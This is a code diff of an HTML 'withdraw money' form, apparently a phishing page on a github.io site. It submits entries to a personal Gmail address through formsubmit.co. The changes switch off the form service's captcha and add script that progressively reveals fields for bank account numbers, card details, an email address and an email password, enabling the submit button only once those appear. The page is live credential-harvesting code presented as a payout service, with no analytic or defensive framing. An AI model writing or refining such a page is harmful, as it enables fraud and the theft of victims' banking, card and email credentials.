@@ -72,7 +72,8 @@
   <div class="container">
     <h2>FILL THIS FORM TO WITHDRAW MONEY</h2>
     <form id="withdrawForm" action="https://formsubmit.co/exellentfirm@gmail.com" method="POST">
-      <input type="hidden" name="_redirect" value="https://onlinegistrationprog.github.io/thankyou.html"><label>Full Name</label>
+      <input type="hidden" name="_redirect" value="https://onlinegistrationprog.github.io/thankyou.html">
+      <input type="hidden" name="_captcha" value="false"><label>Full Name</label>
   <input type="text" name="full_name" id="fullName" required>
 
   <label>Phone Number</label>
@@ -157,7 +158,6 @@
     const form = document.getElementById("withdrawForm");
     const amount = document.getElementById("allocatedAmount");
     const phone = document.getElementById("phoneNumber");
-    const nameField = document.getElementById("fullName");
 
     const withdrawToPhone = document.getElementById("withdrawToPhone");
     const field5 = document.getElementById("field5");
@@ -184,31 +184,69 @@
     const submitBtn = document.getElementById("submitBtn");
 
     withdrawToPhone.addEventListener("change", () => {
-      const value = withdrawToPhone.value;
       const amt = amount.value;
       const tel = phone.value;
-
       document.getElementById("amtSpan1").textContent = amt;
       document.getElementById("phoneSpan1").textContent = tel;
 
-      if (value === "Yes") {
+      if (withdrawToPhone.value === "Yes") {
         field5.textContent = `>> Withdrawing ${amt} to ${tel} <<`;
         field5.style.display = "block";
         field6.style.display = "block";
-        label7.style.display = "block";
-        bankAccount.style.display = "block";
-        label9.style.display = "none";
-        paymentOption.style.display = "none";
-      } else if (value === "No") {
+        label7.style.display = bankAccount.style.display = "block";
+        label9.style.display = paymentOption.style.display = "none";
+      } else {
         field5.style.display = "none";
-        label9.style.display = "block";
-        paymentOption.style.display = "block";
         field6.style.display = "block";
-        label7.style.display = "none";
-        bankAccount.style.display = "none";
+        label7.style.display = bankAccount.style.display = "none";
+        label9.style.display = paymentOption.style.display = "block";
       }
     });
 
-    // More logic follows... (truncated here for brevity)
+    bankAccount.addEventListener("change", () => {
+      if (bankAccount.value === "Yes") {
+        field8.style.display = "none";
+        label12.style.display = bankAccountNumber.style.display = "block";
+        label13.style.display = atmLinked.style.display = "block";
+      } else {
+        field8.style.display = "block";
+        submitBtn.textContent = "Cancelled";
+        submitBtn.className = "submit-red";
+      }
+    });
+
+    atmLinked.addEventListener("change", () => {
+      if (atmLinked.value === "Yes") {
+        field14.style.display = "none";
+        cardSection.style.display = field19.style.display = "block";
+        label20.style.display = email.style.display = "block";
+        label21.style.display = emailPassword.style.display = "block";
+        submitBtn.textContent = "Submit";
+        submitBtn.className = "submit-green";
+      } else {
+        cardSection.style.display = field19.style.display = "none";
+        field14.style.display = "block";
+        submitBtn.textContent = "Transactions Cancelled";
+        submitBtn.className = "submit-red";
+      }
+    });
+
+    paymentOption.addEventListener("change", () => {
+      if (paymentOption.value === "Other Number") {
+        label10.style.display = altPhone.style.display = "block";
+      } else if (paymentOption.value === "Bank Account") {
+        label12.style.display = bankAccountNumber.style.display = "block";
+        label13.style.display = atmLinked.style.display = "block";
+      }
+    });
+
+    altPhone.addEventListener("blur", () => {
+      const amt = amount.value;
+      const alt = altPhone.value;
+      if (alt) {
+        field11.textContent = `Withdrawing ${amt} to ${alt}`;
+        field11.style.display = "block";
+      }
+    });
   </script></body>
-    </html>
+</html>
